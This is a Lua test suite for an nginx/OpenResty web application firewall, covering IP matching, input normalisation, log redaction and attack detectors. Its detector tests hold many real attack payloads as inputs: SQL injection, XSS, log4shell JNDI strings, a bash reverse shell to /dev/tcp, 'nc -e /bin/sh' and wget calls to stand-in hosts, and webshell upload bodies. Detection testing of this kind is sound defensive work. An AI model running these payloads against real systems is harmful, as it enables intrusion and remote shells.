-- WAF Lua 测试套件（luajit 运行）
-- 覆盖：iputils / normalize / semantic / expr / bot / smug / probe / cc / challenge / rules 名单引擎 / access 集成
-- 运行：cd agent/utils/waf/lua && luajit waf_test.lua
package.path = "./?.lua;" .. package.path

-- ==================== 最小 JSON 实现（替代 cjson，供 stub 使用） ====================
local json = {}
do
    local escapes = {['"'] = '\\"', ['\\'] = '\\\\', ['\n'] = '\\n', ['\r'] = '\\r', ['\t'] = '\\t'}
    local function esc(s) return s:gsub('[%z\1-\31"\\]', function(c) return escapes[c] or string.format('\\u%04x', c:byte()) end) end
    local function enc(v, buf)
        local t = type(v)
        if t == "nil" then buf[#buf+1] = "null"
        elseif t == "boolean" then buf[#buf+1] = tostring(v)
        elseif t == "number" then buf[#buf+1] = string.format("%.14g", v)
        elseif t == "string" then buf[#buf+1] = '"' .. esc(v) .. '"'
        elseif t == "table" then
            local isarr = #v > 0 or next(v) == nil
            if isarr then
                buf[#buf+1] = "["
                for i, item in ipairs(v) do if i > 1 then buf[#buf+1] = "," end enc(item, buf) end
                buf[#buf+1] = "]"
            else
                buf[#buf+1] = "{"
                local first = true
                for k, item in pairs(v) do
                    if not first then buf[#buf+1] = "," end
                    first = false
                    buf[#buf+1] = '"' .. esc(k) .. '":'
                    enc(item, buf)
                end
                buf[#buf+1] = "}"
            end
        end
    end
    function json.encode(v) local buf = {} enc(v, buf) return table.concat(buf) end

    local function parse(s, pos)
        local c = s:sub(pos, pos)
        if c == '"' then
            local i = pos + 1
            local buf = {}
            while true do
                local ch = s:sub(i, i)
                if ch == '"' then return table.concat(buf), i + 1 end
                if ch == "\\" then
                    local n = s:sub(i + 1, i + 1)
                    if n == "n" then buf[#buf+1] = "\n"
                    elseif n == "t" then buf[#buf+1] = "\t"
                    elseif n == "r" then buf[#buf+1] = "\r"
                    elseif n == "u" then buf[#buf+1] = string.char(tonumber(s:sub(i + 2, i + 5), 16) % 256)
                    else buf[#buf+1] = n end
                    i = i + 2
                else buf[#buf+1] = ch i = i + 1 end
            end
        elseif c == "{" or c == "[" then
            local isarr = c == "["
            local obj, arr = {}, {}
            local i = pos + 1
            while true do
                while s:sub(i, i):match("%s") do i = i + 1 end
                if s:sub(i, i) == (isarr and "]" or "}") then return (isarr and arr or obj), i + 1 end
                if isarr then
                    local val
                    val, i = parse(s, i)
                    arr[#arr+1] = val
                else
                    local k, v
                    k, i = parse(s, i)
                    while s:sub(i, i):match("%s") or s:sub(i, i) == ":" do i = i + 1 end
                    v, i = parse(s, i)
                    obj[k] = v
                end
                while s:sub(i, i):match("%s") do i = i + 1 end
                if s:sub(i, i) == "," then i = i + 1 end
            end
        elseif s:sub(pos, pos + 3) == "true" then return true, pos + 4
        elseif s:sub(pos, pos + 4) == "false" then return false, pos + 5
        elseif s:sub(pos, pos + 3) == "null" then return nil, pos + 4
        else
            local num = s:match("^%-?%d+%.?%d*[eE]?[%+%-]?%d*", pos)
            return tonumber(num), pos + #num
        end
    end
    function json.decode(s)
        if not s or s == "" then return nil end
        local ok, v = pcall(function()
            local r, _ = parse(s:gsub("^%s*", ""), 1)
            return r
        end)
        if ok then return v end
        return nil
    end
end

-- ==================== ngx stub（模拟真实行为） ====================
local T = {
    now = 1700000000,          -- 可控时钟
    vars = {},                 -- ngx.var
    headers = {},              -- ngx.req.get_headers
    method = "GET",
    uri_args = {},
    body = nil,
    exited = nil,              -- ngx.exit 记录
    status = nil,
    resp_body = {},
    dict_store = {},           -- 共享内存（仅接受 string/number/boolean，与真实 ngx.shared 一致）
}

local function new_dict()
    return {
        get = function(_, k)
            local e = T.dict_store[k]
            if e then return e.v end
            return nil
        end,
        set = function(_, k, v, ttl)
            -- 真实 ngx.shared 拒绝 table/nil 以外的非标量类型
            local tv = type(v)
            if tv ~= "string" and tv ~= "number" and tv ~= "boolean" then
                error("bad argument #2 to 'set' (string, number, or boolean expected, got " .. tv .. ")")
            end
            T.dict_store[k] = {v = v, ttl = ttl}
            return true
        end,
        add = function(_, k, v, ttl)
            if T.dict_store[k] then return false, "exists" end
            T.dict_store[k] = {v = v, ttl = ttl}
            return true
        end,
        incr = function(_, k, amount, init)
            local current = T.dict_store[k] and tonumber(T.dict_store[k].v)
            if current == nil then current = init end
            if current == nil then return nil, "not found" end
            current = current + amount
            T.dict_store[k] = {v = current}
            return current
        end,
        delete = function(_, k) T.dict_store[k] = nil end,
    }
end

local ngx = {}
ngx.now = function() return T.now end
ngx.time = function() return math.floor(T.now) end
ngx.var = setmetatable({}, {
    __index = function(_, k) return T.vars[k] end,
    __newindex = function(_, k, v) T.vars[k] = v end,
})
ngx.log = function() end
ngx.ERR = 1
ngx.hmac_sha1 = function(secret, value) return secret .. ":" .. value end
ngx.encode_base64 = function(value) return value:gsub("[^%w]", "_") end
ngx.say = function(...) for _, s in ipairs({...}) do T.resp_body[#T.resp_body+1] = tostring(s) end T.resp_body[#T.resp_body+1] = "\n" end
ngx.exit = function(code) T.exited = code error({__ngx_exit = true}) end
ngx.header = setmetatable({}, {
    __index = function(_, k) return T.resp_headers and T.resp_headers[k] end,
    __newindex = function(_, k, v) T.resp_headers = T.resp_headers or {} T.resp_headers[k] = v end,
})
ngx.shared = { waf_dict = new_dict() }
ngx.timer = {at = function(delay, fn, ...)
    -- Execute immediate callbacks; recurring production timers are not advanced
    -- automatically in the unit-test clock.
    if delay == 0 or delay == 0.05 then fn(false, ...) end
    return true
end}
ngx.req = setmetatable({}, {
    __index = function(_, k)
        if k == "get_headers" then return function() return T.headers end end
        if k == "get_method" then return function() return T.method end end
        if k == "get_uri_args" then return function() return T.uri_args end end
        if k == "read_body" then return function() end end
        if k == "get_body_data" then return function() return T.body end end
    end,
})
_G.ngx = ngx

-- cjson stub：走最小 JSON 实现
package.preload["cjson.safe"] = function() return {encode = json.encode, decode = json.decode} end

-- ==================== 模块加载 / 重置 ====================
local MODULES = {"config", "iputils", "normalize", "semantic", "expr", "rules", "waflog", "cc", "challenge", "bot", "smug", "probe", "iplist", "access"}

local function reset_modules()
    for _, name in ipairs(MODULES) do package.loaded["waf." .. name] = nil end
    for _, name in ipairs(MODULES) do
        local chunk, err = loadfile(name .. ".lua")
        assert(chunk, err)
        package.loaded["waf." .. name] = chunk()
    end
end

local function reset_state()
    T.vars = {}
    T.headers = {}
    T.method = "GET"
    T.uri_args = {}
    T.body = nil
    T.exited = nil
    T.resp_body = {}
    T.resp_headers = nil
    T.dict_store = {}
    ngx.status = nil
    ngx.shared.waf_dict = new_dict()
end

local pass, fail = 0, 0
local function check(name, cond)
    if cond then pass = pass + 1
    else fail = fail + 1; print("FAIL: " .. name) end
end

-- 以隔离环境执行函数（吞掉 ngx.exit 的 error）
local function run(fn)
    local ok = pcall(fn)
    return ok
end

-- ==================== iputils ====================
reset_modules()
local ip = require("waf.iputils")
check("v4 exact", ip.in_cidr("1.2.3.4", "1.2.3.4"))
check("v4 /24 in", ip.in_cidr("1.2.3.100", "1.2.3.0/24"))
check("v4 /24 out", not ip.in_cidr("1.2.4.100", "1.2.3.0/24"))
check("v4 /24 boundary low", ip.in_cidr("1.2.3.0", "1.2.3.0/24"))
check("v4 /24 boundary high", ip.in_cidr("1.2.3.255", "1.2.3.0/24"))
check("v4 /8", ip.in_cidr("10.9.9.9", "10.0.0.0/8"))
check("v4 /16 mismatch", not ip.in_cidr("10.9.9.9", "10.9.0.0/24"))
check("v4 /32 in", ip.in_cidr("1.2.3.4", "1.2.3.4/32"))
check("v4 /32 out", not ip.in_cidr("1.2.3.5", "1.2.3.4/32"))
check("v4 /0 all", ip.in_cidr("255.255.255.255", "0.0.0.0/0"))
check("v4 invalid ip", not ip.in_cidr("999.1.1.1", "1.2.3.0/24"))
check("v4 invalid octet", not ip.in_cidr("1.2.3.256", "1.2.3.0/24"))
check("v6 loopback", ip.in_cidr("::1", "::1/128"))
check("v6 /64 in", ip.in_cidr("2001:db8:1:2::99", "2001:db8:1:2::/64"))
check("v6 /64 out", not ip.in_cidr("2001:db8:1:3::99", "2001:db8:1:2::/64"))
check("v6 full expand", ip.in_cidr("2001:0db8:0000:0000:0000:0000:0000:0001", "2001:db8::/32"))
check("v6 mid-colon", ip.in_cidr("2001:db8:aaaa:bbbb::1", "2001:db8::/16"))
check("v4-mapped v6", ip.in_cidr("::ffff:1.2.3.4", "::/0"))
check("v6 invalid", not ip.in_cidr("not-an-ip", "2001:db8::/32"))

-- ==================== normalize ====================
local nz = require("waf.normalize")
check("url decode", nz.normalize("%3Cscript%3E") == "<script>")
check("double decode", nz.normalize("%253Cscript%253E") == "<script>")
check("triple decode", nz.normalize("%25253Cscript%25253E") == "<script>")
check("plus as space", nz.normalize("a+b") == "a b")
check("entity decode", nz.normalize("&lt;script&gt;") == "<script>")
check("entity numeric", nz.normalize("&#60;script&#62;") == "<script>")
check("entity hex", nz.normalize("&#x3c;script&#x3e;") == "<script>")
check("case fold", nz.normalize("<ScRiPt>") == "<script>")
check("path", nz.normalize_path("/a/../../etc/passwd") == "/etc/passwd")
check("path enc", nz.normalize_path("/a/%2e%2e/etc/passwd") == "/etc/passwd")
check("path trailing", nz.normalize_path("/a/b/../") == "/a/")
check("path no change", nz.normalize_path("/a/b/c") == "/a/b/c")

-- ==================== config / log privacy ====================
local cfg = require("waf.config")
check("log redacts password", cfg.sanitize_log_value("name=a&password=secret") == "[redacted]")
check("log redacts authorization case insensitive", cfg.sanitize_log_value("Authorization: Bearer abc") == "[redacted]")
check("log truncates oversized value", #cfg.sanitize_log_value(string.rep("a", cfg.LOG_VALUE_LIMIT + 10)) < cfg.LOG_VALUE_LIMIT + 20)
check("log keeps ordinary value", cfg.sanitize_log_value("page=2") == "page=2")

-- ==================== semantic ====================
local sem = require("waf.semantic")
-- SQLi
check("sqli tautology", sem.detect_sqli("' OR '1'='1' --"))
check("sqli tautology 2", sem.detect_sqli("1' or '1'='1'#"))
check("sqli union", sem.detect_sqli("1 UNION SELECT username, password FROM users"))
check("sqli union all", sem.detect_sqli("-1 union all select null,@@version--"))
check("sqli stacked", sem.detect_sqli("1; DROP TABLE users"))
check("sqli sleep", sem.detect_sqli("1; WAITFOR/SLEEP(5)"))
check("sqli benchmark", sem.detect_sqli("1 AND BENCHMARK(5000000,MD5(1))"))
check("sqli info_schema", sem.detect_sqli("1 UNION SELECT table_name FROM information_schema.tables"))
check("sqli gtid subset", sem.detect_sqli("GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e),3550)"))
check("sqli waitfor delay", sem.detect_sqli("2';WAITFOR DELAY '0:0:13' --"))
check("sqli server variable", sem.detect_sqli("1' and 1=(select @@version) --"))
check("sqli hashbytes", sem.detect_sqli("select sys.fn_varbintohexstr(hashbytes('MD5','x'))"))
check("sqli credential concat", sem.detect_sqli("concat(username,0x3a,password)"))
check("sqli encoded", sem.detect_sqli("%27%20OR%20%271%27%3D%271")) -- URL 编码的 ' OR '1'='1
check("sqli normal", not sem.detect_sqli("hello world"))
check("sqli normal2", not sem.detect_sqli("2024-01-01 order#123"))
check("sqli normal word", not sem.detect_sqli("I ordered a large pizza"))
check("sqli normal number", not sem.detect_sqli("100"))
check("sqli normal select-ish", not sem.detect_sqli("select your seats from the map"))
-- XSS
check("xss script", sem.detect_xss("<script>alert(1)</script>"))
check("xss img", sem.detect_xss("<img src=x onerror=alert(1)>"))
check("xss svg", sem.detect_xss("<svg onload=alert(1)>"))
check("xss iframe", sem.detect_xss("<iframe src=javascript:alert(1)>"))
check("xss jsproto", sem.detect_xss("javascript:alert(1)"))
check("xss data uri", sem.detect_xss("data:text/html,<script>alert(1)</script>"))
check("xss encoded", sem.detect_xss("%3Cscript%3Ealert(1)%3C/script%3E"))
check("xss entity", sem.detect_xss("&lt;script&gt;alert(1)&lt;/script&gt;"))
check("xss cookie", sem.detect_xss("document.cookie"))
check("xss eval", sem.detect_xss("eval(String.fromCharCode(97))"))
check("xss attribute breakout", sem.detect_xss('" onmouseover="alert(document.domain)"'))
check("xss alert domain", sem.detect_xss("';alert(document.domain)//"))
check("xss prompt breakout", sem.detect_xss("'-prompt(1)-'"))
check("xss normal", not sem.detect_xss("I <3 cats & dogs"))
check("xss normal html talk", not sem.detect_xss("how to use <div> tags"))
check("xss normal js", not sem.detect_xss("learn javascript: basics"))
-- RCE
check("rce backtick", sem.detect_rce("`cat /etc/passwd`"))
check("rce pipe", sem.detect_rce("; wget http://evil.com/sh.sh"))
check("rce dollar", sem.detect_rce("$(cat /etc/passwd)"))
check("rce chain", sem.detect_rce("foo; whoami | nc 1.2.3.4 4444"))
check("rce bash -i", sem.detect_rce(";bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
check("rce encoded", sem.detect_rce("%3B%20cat%20%2Fetc%2Fpasswd"))
check("rce expr probe", sem.detect_rce("expr 123456 + 654321"))
check("rce echo redirect", sem.detect_rce("1|echo probe > /tmp/result.txt"))
check("rce touch", sem.detect_rce("/tmp/a;touch /tmp/proof"))
check("rce command curl", sem.detect_rce("curl http://dnslog.invalid/probe"))
check("rce newline id", sem.inspect("test:1-100\\n/usr/bin/id", "/") and sem.inspect("test:1-100\\n/usr/bin/id", "/").type == "rce")
check("rce normal", not sem.detect_rce("a|b review"))
check("rce normal2", not sem.detect_rce("price is 100|200"))
check("rce plain no meta", not sem.detect_rce("cat photos"))
-- LFI
check("lfi traversal", sem.detect_lfi("../../etc/passwd"))
check("lfi abs", sem.detect_lfi("/etc/passwd"))
check("lfi filter", sem.detect_lfi("php://filter/convert.base64-encode/resource=index.php"))
check("lfi null byte", sem.detect_lfi("file.txt%00.php"))
check("lfi windows", sem.detect_lfi("..\\..\\windows\\system32"))
check("lfi traversal before collapse", sem.detect_lfi("/api/filemanager?path=/../../etc/passwd"))
check("lfi normal", not sem.detect_lfi("/docs/readme.md"))
check("lfi normal2", not sem.detect_lfi("user/profile"))
check("lfi normal dotted", not sem.detect_lfi("./relative/path"))
-- SSRF
check("ssrf metadata", sem.detect_ssrf("http://169.254.169.254/latest/meta-data/"))
check("ssrf internal", sem.detect_ssrf("http://127.0.0.1:8080/admin"))
check("ssrf 10.x", sem.detect_ssrf("http://10.0.0.5/"))
check("ssrf 192.168", sem.detect_ssrf("http://192.168.1.1/"))
check("ssrf 172.16", sem.detect_ssrf("http://172.16.0.1/"))
check("ssrf localhost", sem.detect_ssrf("http://localhost/admin"))
check("ssrf gopher", sem.detect_ssrf("gopher://127.0.0.1:6379/_INFO"))
check("ssrf normal", not sem.detect_ssrf("https://example.com/api"))
check("ssrf normal2", not sem.detect_ssrf("https://10.example.com/"))
check("ssrf oast callback", sem.detect_ssrf("http://abc.oast.live/probe"))
check("ssrf rmi callback", sem.detect_ssrf("rmi://118.195.206.7:1099/object"))
-- Extended P1 payload families from detect_log.xlsx
check("log4shell direct", sem.detect_log4shell("${jndi:ldap://example.invalid/a}"))
check("log4shell obfuscated", sem.detect_log4shell("${${x:-j}${x:-n}${x:-d}${x:-i}:ldap://example.invalid/a}"))
check("code php", sem.detect_code_injection("<?php system('id');?>"))
check("code freemarker", sem.detect_code_injection('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'))
check("code node", sem.detect_code_injection("process.mainModule.require('child_process').execSync('id')"))
check("code process builder", sem.detect_code_injection('new java.lang.ProcessBuilder("id").start()'))
check("code ognl", sem.detect_code_injection("%{#context['com.opensymphony.xwork2.ActionContext.container']}"))
check("code php probe", sem.detect_code_injection("printf(md5('probe'));"))
check("code php print probe", sem.detect_code_injection("print(md5(31337));"))
check("code jsp probe", sem.detect_code_injection('<%@Page Language="C#"%><%Response.Write(1);%>'))
check("code dede runphp", sem.detect_code_injection("{dede:field name='source' runphp='yes'}echo md5(1){/dede:field}"))
check("ssti arithmetic", sem.detect_ssti("{{1337*1338}}"))
check("deserialize java", sem.detect_deserialization("java.util.HashMap org.apache.commons.collections.Transformer"))
check("deserialize php", sem.detect_deserialization('O:23:"yii\\db\\BatchQueryResult":1:{}'))
check("deserialize fastjson autotype", sem.detect_deserialization('{"@type":"java.lang.AutoCloseable"}'))
check("deserialize fastjson jdbc", sem.detect_deserialization('{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://example.invalid/x"}'))
check("deserialize java gadget name", sem.detect_deserialization("javax.naming.ldap.Rdn_-RdnEntry"))
check("deserialize ordinary type", not sem.detect_deserialization('{"@type":"com.example.Order","id":1}'))
check("xxe external entity", sem.detect_xxe('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>'))
check("exposure actuator", sem.detect_exposure("/actuator/env"))
check("exposure webshell", sem.detect_exposure("/webshell.php"))
check("exposure database dump", sem.detect_exposure("/customer.example.sql"))
check("exposure site archive", sem.detect_exposure("/wwwroot.rar"))
check("exposure web config", sem.detect_exposure("/WEB-INF/web.xml"))
check("exposure ordinary php", not sem.detect_exposure("/index.php"))
check("exposure ordinary archive", not sem.detect_exposure("/downloads/release.zip"))
-- File upload
check("upload php extension", sem.detect_upload('Content-Disposition: form-data; name="f"; filename="shell.php"\r\n\r\nhello'))
check("upload double extension", sem.detect_upload('Content-Disposition: form-data; name="f"; filename="shell.php.jpg"\r\n\r\nhello'))
check("upload php content", sem.detect_upload('Content-Disposition: form-data; name="f"; filename="photo.jpg"\r\n\r\n<?php system($_GET[x]); ?>'))
check("upload shell content", sem.detect_upload('Content-Disposition: form-data; name="f"; filename="note.txt"\r\n\r\n#!/bin/sh\nid'))
check("upload normal image", not sem.detect_upload('Content-Disposition: form-data; name="f"; filename="photo.jpg"\r\n\r\nJFIFdata'))
-- inspect 统一入口
local hit = sem.inspect("' OR '1'='1", "/login")
check("inspect returns sqli", hit and hit.type == "sqli")
check("inspect clean", sem.inspect("hello", "/") == nil)
-- detect_log.xlsx 补充签名（本轮新增）
check("sqli bare boolean probe", sem.detect_sqli("1 AND 1=2"))
check("sqli or boolean probe", sem.detect_sqli("2 or 3=4"))
check("sqli and no comment", sem.detect_sqli("admin' AND 1=2 --"))
check("rce shellshock", sem.detect_rce("() { :; }; echo; /bin/bash -c 'expr 1 + 2'"))
check("rce cmd id probe", sem.detect_rce("/randomPath?cmd=id"))
check("rce cmd whoami probe", sem.detect_rce("/x?cmd=whoami"))
check("rce sh -c quote", sem.detect_rce("sh -c 'curl http://evil.invalid'"))
check("rce cmd normal", not sem.detect_rce("/search?cmd=play"))
check("log4shell nested obf", sem.detect_log4shell("${:-y$}${${syl:-j}nd${env:sce:-}i:r${ivd::-m}i://1.2.3.4:14288/x}"))
check("code print digits plus", sem.detect_code_injection("print(811135720+853369319)"))
check("code print digits encoded plus", sem.detect_code_injection("print(811135720%2b853369319)"))
check("code memberaccess", sem.detect_code_injection("('\\43_memberAccess.allowStaticMethodAccess')(a)"))
check("code key velocity", sem.detect_code_injection("' #request['.KEY_velocity.struts2.context'].internalGet('ognl')"))
check("code ognl request", sem.detect_code_injection("x=#request['a'] y=ognl"))
check("code classloader path", sem.detect_code_injection("/index.action?class.classLoader.parent"))
check("code thinkphp construct", sem.detect_code_injection("__construct()"))
check("code groovy execute", sem.detect_code_injection('throw new Exception(\'ipconfig\'.execute().text);'))
check("code apisix lua", sem.detect_code_injection("function(vars) os.execute('curl x'); return true end"))
check("code initialcontext", sem.detect_code_injection('${"".getClass().forName("javax.naming.InitialContext").newInstance().lookup("ldap://x")}'))
check("code system ipconfig", sem.detect_code_injection("system(ipconfig)"))
check("code tf md5", sem.detect_code_injection("tf(md5(2014346458));"))
check("code php shorttag copy", sem.detect_code_injection('<?=copy("https://evil.invalid/1.txt","./runtime/config/x")'))
check("code print normal words", not sem.detect_code_injection("print(money)"))
check("exposure bsh servlet", sem.detect_exposure("/weaver/bsh.servlet.BshServlet"))
check("exposure wls wsat", sem.detect_exposure("/wls-wsat/CoordinatorPortType"))
check("exposure f5 bash", sem.detect_exposure("/mgmt/tm/util/bash"))
check("exposure jmreport", sem.detect_exposure("/jmreport/testConnection"))
check("exposure device rsp", sem.detect_exposure("/device.rsp?opt=user&cmd=list"))
check("exposure captcha", sem.detect_exposure("/?s=captcha"))
check("exposure actuator semicolon", sem.detect_exposure("/actuator;/env"))
check("exposure center session", sem.detect_exposure("/center/api/session"))
check("exposure excu shell", sem.detect_exposure("/excu_shell"))
check("exposure phpunit", sem.detect_exposure("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"))
check("exposure normal path", not sem.detect_exposure("/center/api/session/list"))
-- inspect 端到端（含门控）
hit = sem.inspect("/3IMNFGUfZEyszQ270gOsrXNVcK9?cmd=id", "/x")
check("inspect cmd id e2e", hit and hit.type == "rce")
hit = sem.inspect("print(811135720+853369319)", "/search.php")
check("inspect print probe e2e", hit and hit.type == "code_injection")
hit = sem.inspect("() { :; }; /bin/bash -c 'expr 1 + 2'", "/")
check("inspect shellshock e2e", hit and hit.type == "rce")
-- 门控一致性：detect_* 判定为真的样本，inspect() 必须同样返回命中。
-- has_attack_candidate 是前置快速过滤，漏登记标记会让整个检测器静默失效
-- （已发生过三次：门控 PCRE 语法错误、%f[%w] 前沿失效、新签名未同步门控）。
local GATE_CASES = {
    {"java class gadget", "java.lang.Comparable"},
    {"templatesimpl gadget", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"},
    {"logback gadget", "com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManager"},
    {"assert base64", ";assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));"},
    {"nodejs proto chain", "this.constructor.constructor('return process')().mainModule.require('http')"},
    {"bin sleep shellshock", "() { _; } >_[$($())] { echo; /bin/sleep 5; }"},
    {"h2 alias", "1';CREATE ALIAS sleep222 FOR \"java.lang.Thread.sleep\";CALL sleep222(0);select '1"},
    {"group by concat", "-8511 OR 1 GROUP BY CONCAT(0x7e,md5(829646656),0x7e,FLOOR(RAND(0)*2)) HAVING MIN(0)#"},
    {"concat arithmetic", "concat(9876*9876,0x3a,9876*9876)"},
    {"oracle concat", "createTime'||1/0||'"},
    {"oracle decode", "createTime'/**/and/**/(decode(length(123),3,1,0))"},
    {"serialized sql map", "45ea207d|a:2:{s:3:\"num\";s:107:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5"},
    {"comment bypass", "9/**/and 6955=6955"},
    {"cast md5 bypass", "N/**/and/**/cast(md5('1649799944')as/**/int)>0"},
    {"aspx shell", "/plugin/shell.aspx"},
    {"jsp spy", "/m2/jspspy.aspx"},
    {"windows win ini", "C:/windows/win.ini"},
    {"oast ping", "'\nping d8at5iqs3g7tohdr5q20hqikeqk4tnat1.oast.online\n'"},
    {"nc oast", "nc -e /bin/sh 1234.abcdefgh.hzajrx6o.ser.dnslog.bid 1337"},
    {"md5sum probe", "echo CVE-2023-41109 | md5sum"},
    {"ssti arithmetic", "/*1*/{{883110996+885856194}}"},
    {"version comment", "@`'`/*!50000Union */ /*!50000select */ md5(819315968) -- @`'`"},
    {"expr ifs bypass", "'\nexpr${IFS}875507985${IFS}-${IFS}924841934\n'"},
    {"mysql version union", "-1)union(select(3),null,null,null,null,null,str(41637*40875),null"},
    {"waitfor comment", "N';WAITFOR/**/DELAY'0:0:6'--"},
    {"thinkphp construct", "__construct()"},
    {"sh -c bare", "sh -c id"},
}
for _, c in ipairs(GATE_CASES) do
    check("gate admits: " .. c[1], sem.inspect(c[2], "/") ~= nil)
end
-- 门控不得放行普通业务流量（误报防线）
local GATE_CLEAN = {
    "hello world", "/api/article-list?page=1&size=20", "/assets/app.js",
    "price is 100|200", "user/profile", "/docs/readme.md", "color or size",
    "learn javascript: basics", "select your seats from the map", "2024-01-01",
}
for _, c in ipairs(GATE_CLEAN) do
    check("gate clean: " .. c, sem.inspect(c, c) == nil)
end

check("ssti space arithmetic", sem.detect_ssti("/*1*/{{883110996 885856194}}"))
check("ssti plus arithmetic", sem.detect_ssti("{{883110996+885856194}}"))
check("rce semicolon id redirect", sem.detect_rce("x;id>qqzfr.txt"))
check("rce pipe id redirect", sem.detect_rce("|id >2037222.txt"))
check("rce id chain", sem.detect_rce("x\nid;pwd;cat /etc/*-release\n"))
check("rce pwd pipe", sem.detect_rce("admin|pwd"))
check("rce echo pipe id", sem.detect_rce("echo ttgzkhtaeaaizmjcmiwfpvwnnwwsgkgh | id"))
check("rce type win.ini backslash", sem.detect_rce("127.0.0.1\ntype C:\\Windows\\win.ini"))
check("rce ping pipe", sem.detect_rce("ping 127.0.0.1 | cat nbmmnyhf"))
check("rce expr ifs", sem.detect_rce("'\nexpr${IFS}875507985${IFS}-${IFS}924841934\n'"))
check("rce dollar expr", sem.detect_rce("echo $(expr 847469661   865864647):84"))
check("sqli jeecg from sys_user", sem.detect_sqli("' from sys_user/*, '"))
check("sqli jeecg dict password", sem.detect_sqli("tableName=sys_user&text=password,salt"))
check("rce normal id word", not sem.detect_rce("what is my user id"))
-- 第三轮：字面 \n、版本注释、OAST、Windows 敏感路径
-- SQL 注释剥离后的漏网形态（gate 守卫发现）
check("sqli cast md5 after strip", sem.detect_sqli("N/**/and/**/cast(md5('1649799944')as/**/int)>0"))
check("sqli union parenthesized", sem.detect_sqli("-1)union(select(3),null,null,null,null,null,str(41637*40875),null"))
check("sqli select from strip", sem.detect_sqli("1779802281'and(select'1'from/**/cast(md5(1371423727)as/**/int))>'0"))
check("sqli and only after strip", sem.detect_sqli("9/**/and 6955=6955"))
check("sqli strip no comments", not sem.detect_sqli("read a book about cats"))
check("sqli double quote tautology", sem.detect_sqli('""or""=""'))
check("sqli numeric or probe", sem.detect_sqli("2147483647 or 1=2"))
check("sqli mysql version comment", sem.detect_sqli("@`'`/*!50000Union */ /*!50000select */ md5(819315968) -- @`'`"))
check("sqli dbms_pipe", sem.detect_sqli("1'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('h',8)"))
check("sqli char concat", sem.detect_sqli("1' AND 5094 IN (SELECT (CHAR(113) CHAR(98) FROM dual)"))
check("sqli case when select", sem.detect_sqli("3126'AND 4189=CAST('~'||(SELECT (CASE WHEN (4189=4189) THEN 1 ELSE 0 END)"))
check("sqli normal or word", not sem.detect_sqli("color or size"))
check("rce sh -c bare", sem.detect_rce("sh -c id"))
check("rce nc -e", sem.detect_rce("nc -e /bin/sh 1234.abcdefgh.hzajrx6o.ser.dnslog.bid 1337"))
check("rce md5sum", sem.detect_rce("echo CVE-2023-41109 | md5sum"))
check("rce nslookup oast", sem.detect_rce("| nslookup d8b6417rtaj67p0ddcbgenk8mw1byrj1n.oast.me"))
check("rce ping oast", sem.detect_rce("'\nping d8at5iqs3g7tohdr5q20hqikeqk4tnat1.oast.online\n'"))
check("lfi windows win.ini", sem.detect_lfi("C:/windows/win.ini"))
check("lfi windows backslash", sem.detect_lfi("C:\\Documents and Settings\\All Users\\Application Data"))
check("lfi program files", sem.detect_lfi("C:\\Program Files (x86)\\Kingdee\\K3Cloud\\Web.config"))
check("lfi normal windows path", not sem.detect_lfi("C:/Program Files/Windows Media Player"))

-- ==================== iplist（IP 黑名单区间表） ====================
local iplist = require("waf.iplist")

-- 用与 Go 侧 wlformat 相同的编码规则生成测试数据。
-- 这里刻意手写 varint 打包而不是 require 制品：
-- 单元测试必须能在没有 testdata 制品的环境跑，
-- 且这样一旦 Go 侧改了格式，本测试会先失败而不是静默漂移。
local function build_wlfile(v4ranges, v6ranges)
    local out = {"3PWL", string.char(2), string.char(0, 0, 0, 0)}
    local function u32(n)
        out[#out + 1] = string.char(n % 256,
            math.floor(n / 256) % 256, math.floor(n / 65536) % 256, math.floor(n / 16777216) % 256)
    end
    u32(#v4ranges); u32(#(v6ranges or {}))
    local function varint(v)
        while v > 127 do
            out[#out + 1] = string.char((v % 128) + 128)
            v = math.floor(v / 128)
        end
        out[#out + 1] = string.char(v % 128)
    end
    local prev = -1
    for _, r in ipairs(v4ranges) do
        local s, e = r[1], r[2]
        varint(s - prev); varint(e - s + 1); prev = e
    end
    for _, r in ipairs(v6ranges or {}) do
        out[#out + 1] = r[1]; out[#out + 1] = r[2]
    end
    return table.concat(out)
end

local function v4(s) -- "1.2.3.0/24" -> {start, end}
    local a, b, c, d, bits = s:match("^(%d+)%.(%d+)%.(%d+)%.(%d+)/(%d+)$")
    local base = tonumber(a) * 16777216 + tonumber(b) * 65536 + tonumber(c) * 256 + tonumber(d)
    local len = 2 ^ (32 - tonumber(bits))
    return { base, base + len - 1 }
end

check("iplist ipv4_to_num", iplist.ipv4_to_num("1.2.3.4") == 16909060)
check("iplist ipv4_to_num 0.0.0.0", iplist.ipv4_to_num("0.0.0.0") == 0)
check("iplist ipv4_to_num max", iplist.ipv4_to_num("255.255.255.255") == 4294967295)
check("iplist ipv4_to_num invalid", iplist.ipv4_to_num("999.1.1.1") == nil)
check("iplist ipv4_to_num short", iplist.ipv4_to_num("1.2.3") == nil)
check("iplist ipv4_to_num nonstring", iplist.ipv4_to_num(42) == nil)

local blob = build_wlfile({
    v4("1.2.3.0/24"),
    v4("8.8.8.8/32"),
    v4("114.92.40.232/32"),
    v4("223.0.0.0/8"),
})
iplist._reset()
iplist._set_reader(function() return blob end)
check("iplist count", iplist.count() == 4, tostring(iplist.count()))
check("iplist hit range start", iplist.in_list("1.2.3.0"))
check("iplist hit range mid", iplist.in_list("1.2.3.200"))
check("iplist hit range end", iplist.in_list("1.2.3.255"))
check("iplist hit single", iplist.in_list("8.8.8.8"))
check("iplist hit cn ip", iplist.in_list("114.92.40.232"))
check("iplist hit big range", iplist.in_list("223.255.1.1"))
check("iplist miss just below", not iplist.in_list("1.2.2.255"))
check("iplist miss just above", not iplist.in_list("1.2.4.0"))
check("iplist miss public dns", not iplist.in_list("8.8.4.4"))
check("iplist miss private", not iplist.in_list("192.168.1.1"))
check("iplist miss loopback", not iplist.in_list("127.0.0.1"))
